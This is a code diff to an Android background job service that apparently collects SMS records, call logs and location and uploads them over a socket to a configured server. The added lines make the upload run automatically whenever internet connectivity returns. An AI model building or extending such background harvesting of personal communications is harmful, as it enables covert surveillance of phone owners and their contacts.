@@ -5,7 +5,10 @@ import android.app.job.JobService;
 import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
+import android.net.NetworkRequest;
 import android.os.Build;
 import android.os.Environment;
 import android.support.annotation.RequiresApi;
@@ -49,12 +52,14 @@ public class NetworkSchedulerService extends JobService {
     public static Socket socket;
     public static boolean connected = false;
     private static int MAX_RECONNECT = 10;
+    private static boolean is_syncing = false;
 
     private int reconnects = 0;
     private LocationMonitor locationTask;
     private CommonParams commonParams;
     private NetworkSchedulerService client;
     private JobParameters jobParameters;
+    private ConnectivityManager.NetworkCallback networkCallback;
 
     @Override
     public void onCreate() {
@@ -115,11 +120,15 @@ public class NetworkSchedulerService extends JobService {
     }
 
     public void connect() {
-        if (hasConnection() && !connected && socket != null)
+        if (hasConnection() && !connected && socket != null && !socket.connected())
             socket.connect();
     }
 
     public void sync() {
+
+        if (is_syncing || !hasConnection()) return;
+
+        is_syncing = true;
         connect();
         smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
             @Override
@@ -130,6 +139,7 @@ public class NetworkSchedulerService extends JobService {
                     @Override
                     public void onResult(boolean success) {
                         Log.i(TAG, "Done submit call logs!!!!");
+                        is_syncing = false;
                     }
                 });
 
@@ -138,7 +148,7 @@ public class NetworkSchedulerService extends JobService {
     }
 
     public void disconnect() {
-        if (socket != null) socket.disconnect();
+        if (socket != null && socket.connected()) socket.disconnect();
     }
 
     private void init() {
@@ -149,6 +159,7 @@ public class NetworkSchedulerService extends JobService {
         if (client == null) client = this;
         if (locationTask == null) locationTask = new LocationMonitor(this);
         if (socket == null) createSocket(commonParams.getServer());
+        if (networkCallback == null) createChangeConnectivityMonitor();
 
         Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
 
@@ -289,7 +300,11 @@ public class NetworkSchedulerService extends JobService {
                         Log.i(TAG, "Socket reconnecting...");
                     } else {
                         reconnects = 0;
-                        jobFinished(jobParameters, true);
+                        try {
+                            jobFinished(jobParameters, true);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
                         disconnect();
                     }
                 }
@@ -297,6 +312,36 @@ public class NetworkSchedulerService extends JobService {
 
         } catch (URISyntaxException e) {
             e.printStackTrace();
+        }
+
+    }
+
+    private void createChangeConnectivityMonitor() {
+
+        NetworkRequest networkRequest = new NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build();
+
+        networkCallback = new ConnectivityManager.NetworkCallback() {
+
+            @Override
+            public void onAvailable(Network network) {
+                Log.i(TAG, "On available network");
+                sync();
+            }
+
+            @Override
+            public void onLost(Network network) {
+                Log.i(TAG, "On not available network");
+                disconnect();
+            }
+        };
+
+        ConnectivityManager connectivityManager = (ConnectivityManager)
+                getSystemService(Context.CONNECTIVITY_SERVICE);
+
+        if (connectivityManager != null) {
+            connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
         }
 
     }
